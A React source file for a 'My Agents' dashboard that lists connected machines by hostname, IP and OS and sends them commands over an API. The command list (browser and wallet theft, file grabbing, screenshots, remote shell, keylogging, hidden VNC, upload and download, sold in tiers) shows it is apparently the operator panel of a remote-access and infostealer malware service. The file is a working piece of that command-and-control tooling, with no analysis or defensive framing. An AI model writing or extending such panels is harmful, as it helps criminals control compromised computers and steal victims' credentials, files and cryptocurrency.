import React, { useState, useEffect } from 'react';
import { 
  Activity, 
  Search, 
  Terminal, 
  Eye, 
  CheckCircle,
  AlertCircle,
  Clock,
  Cpu,
  Send,
  Download,
  Shield,
  Crown,
  MoreHorizontal,
  Square,
  RefreshCw,
  Monitor
} from 'lucide-react';

const ClientAgents = () => {
  const [agents, setAgents] = useState([]);
  const [filteredAgents, setFilteredAgents] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedAgent, setSelectedAgent] = useState(null);
  const [showCommandModal, setShowCommandModal] = useState(false);
  const [command, setCommand] = useState('');
  const [commandHistory, setCommandHistory] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    fetchAgents();
    const interval = setInterval(fetchAgents, 15000); // Update every 15 seconds
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    let filtered = agents;
    if (searchTerm) {
      filtered = filtered.filter(agent =>
        agent.hostname.toLowerCase().includes(searchTerm.toLowerCase()) ||
        agent.ip_address.includes(searchTerm)
      );
    }
    setFilteredAgents(filtered);
  }, [agents, searchTerm]);

  const fetchAgents = async () => {
    setLoading(true);
    try {
      const token = localStorage.getItem('token');
      const response = await fetch('http://localhost:3001/api/client/agents', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (!response.ok) throw new Error('Failed to fetch agents.');
      const data = await response.json();
      setAgents(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleSendCommand = (agent) => {
    setSelectedAgent(agent);
    setShowCommandModal(true);
  };

  const executeCommand = async () => {
    if (!command.trim() || !selectedAgent) return;

    const newCommand = {
      id: Date.now(),
      command: command,
      timestamp: new Date().toISOString(),
      status: 'sending'
    };
    setCommandHistory(prev => [...prev, newCommand]);
    
    try {
        const token = localStorage.getItem('token');
        await fetch(`http://localhost:3001/api/agents/${selectedAgent.id}/command`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({ command }),
        });
        setCommandHistory(prev => prev.map(c => c.id === newCommand.id ? {...c, status: 'sent'} : c));
    } catch (error) {
        setCommandHistory(prev => prev.map(c => c.id === newCommand.id ? {...c, status: 'failed'} : c));
    }

    setCommand('');
    // Do not close modal automatically to see result
    // setShowCommandModal(false);
  };

  const getStatusBadge = (status) => {
    const statusConfig = {
      online: { color: 'bg-green-100 text-green-700', text: 'Online', icon: CheckCircle },
      offline: { color: 'bg-red-100 text-red-700', text: 'Offline', icon: AlertCircle },
      idle: { color: 'bg-yellow-100 text-yellow-700', text: 'Idle', icon: Clock }
    };
    const config = statusConfig[status] || statusConfig.offline;
    const Icon = config.icon;
    return (
      <span className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium ${config.color}`}>
        <Icon className="w-3 h-3" />
        {config.text}
      </span>
    );
  };
  
  const getTierBadge = (tier) => {
    if (tier === 'TIER1') {
      return <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-blue-100 text-blue-700"><Shield className="w-3 h-3" />Tier 1</span>;
    }
    return <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-purple-100 text-purple-700"><Crown className="w-3 h-3" />Tier 2</span>;
  };

  const CommandModal = ({ isOpen, onClose, agent }) => {
    if (!isOpen) return null;

    const tier1Commands = ['browsers', 'wallets', 'files', 'screenshot'];
    const tier2Commands = ['shell [cmd]', 'keylog_start', 'keylog_stop', 'hvnc_start', 'upload', 'download'];
    const availableCommands = agent?.tier === 'TIER2' ? [...tier1Commands, ...tier2Commands] : tier1Commands;

    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <div className="bg-white rounded-xl shadow-2xl w-full max-w-2xl max-h-[80vh] flex flex-col">
          <div className="flex items-center justify-between p-6 border-b border-slate-200">
            <div>
              <h3 className="text-lg font-semibold text-slate-900">Command Interface</h3>
              <p className="text-sm text-slate-600">Agent: {agent?.hostname} ({agent?.ip_address})</p>
            </div>
            <button onClick={onClose} className="p-2 hover:bg-slate-100 rounded-lg"><Square className="w-5 h-5" /></button>
          </div>
          <div className="p-6 space-y-4 overflow-y-auto">
            <div>
              <h4 className="font-medium text-slate-900 mb-2">Available Commands</h4>
              <div className="bg-slate-50 rounded-lg p-4 max-h-40 overflow-y-auto font-mono text-sm text-slate-700 space-y-1">
                {availableCommands.map((cmd, i) => <div key={i}>{cmd}</div>)}
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-2">Command</label>
              <div className="flex gap-2">
                <input type="text" value={command} onChange={(e) => setCommand(e.target.value)} placeholder="Enter command..." className="flex-1 px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono" onKeyPress={(e) => e.key === 'Enter' && executeCommand()} />
                <button onClick={executeCommand} className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"><Send className="w-4 h-4" />Send</button>
              </div>
            </div>
            <div>
              <h4 className="font-medium text-slate-900 mb-2">Command History</h4>
              <div className="bg-slate-900 rounded-lg p-4 max-h-40 overflow-y-auto font-mono text-sm space-y-2">
                {commandHistory.length > 0 ? commandHistory.map(cmd => (
                  <div key={cmd.id} className="text-green-400">
                    <span className="text-slate-400">$ </span>{cmd.command}
                    <span className="text-xs text-yellow-400 ml-2">({cmd.status})</span>
                  </div>
                )) : <div className="text-slate-500">No commands sent yet.</div>}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  };

  if (loading && !agents.length) return <div className="p-6">Loading agents...</div>
  if (error) return <div className="p-6 text-red-500">Error: {error}</div>

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900">My Agents</h1>
          <p className="text-slate-600 mt-1">Monitor and control your active agents in real-time</p>
        </div>
        <button onClick={fetchAgents} className="flex items-center gap-2 px-4 py-2 border border-slate-300 rounded-lg hover:bg-slate-50"><RefreshCw className="w-4 h-4" />Refresh</button>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="bg-white rounded-xl shadow-sm p-6"><div className="flex items-center gap-3"><div className="p-2 bg-green-100 rounded-lg"><Activity className="w-5 h-5 text-green-600" /></div><div><p className="text-2xl font-bold">{agents.filter(a => a.status === 'online').length}</p><p className="text-slate-600 text-sm">Online</p></div></div></div>
        <div className="bg-white rounded-xl shadow-sm p-6"><div className="flex items-center gap-3"><div className="p-2 bg-blue-100 rounded-lg"><Monitor className="w-5 h-5 text-blue-600" /></div><div><p className="text-2xl font-bold">{agents.length}</p><p className="text-slate-600 text-sm">Total</p></div></div></div>
      </div>
      
      <div className="bg-white rounded-xl shadow-sm p-6">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-4 h-4" />
          <input type="text" placeholder="Search by hostname or IP..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="w-full pl-10 pr-4 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
        </div>
      </div>

      <div className="bg-white rounded-xl shadow-sm overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-slate-50 border-b">
              <tr>
                <th className="text-left p-4 font-medium text-slate-700">Agent</th>
                <th className="text-left p-4 font-medium text-slate-700">Status</th>
                <th className="text-left p-4 font-medium text-slate-700">Tier</th>
                <th className="text-left p-4 font-medium text-slate-700">OS</th>
                <th className="text-left p-4 font-medium text-slate-700">Last Seen</th>
                <th className="text-left p-4 font-medium text-slate-700">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y">
              {filteredAgents.map((agent) => (
                <tr key={agent.agent_id} className="hover:bg-slate-50">
                  <td className="p-4">
                    <div className="font-medium">{agent.hostname}</div>
                    <div className="text-sm text-slate-500">{agent.ip_address}</div>
                  </td>
                  <td className="p-4">{getStatusBadge(agent.status)}</td>
                  <td className="p-4">{getTierBadge(agent.tier)}</td>
                  <td className="p-4 text-sm">{agent.os_info}</td>
                  <td className="p-4 text-sm">{new Date(agent.last_seen).toLocaleString()}</td>
                  <td className="p-4">
                    <div className="flex items-center gap-2">
                      <button onClick={() => handleSendCommand(agent)} disabled={agent.status === 'offline'} className="p-2 text-slate-600 hover:text-blue-600 rounded-lg disabled:opacity-50"><Terminal className="w-4 h-4" /></button>
                      <button className="p-2 text-slate-600 hover:text-green-600 rounded-lg"><Eye className="w-4 h-4" /></button>
                      <button className="p-2 text-slate-600 hover:text-slate-900 rounded-lg"><MoreHorizontal className="w-4 h-4" /></button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <CommandModal isOpen={showCommandModal} onClose={() => setShowCommandModal(false)} agent={selectedAgent} />
    </div>
  );
};

export default ClientAgents; 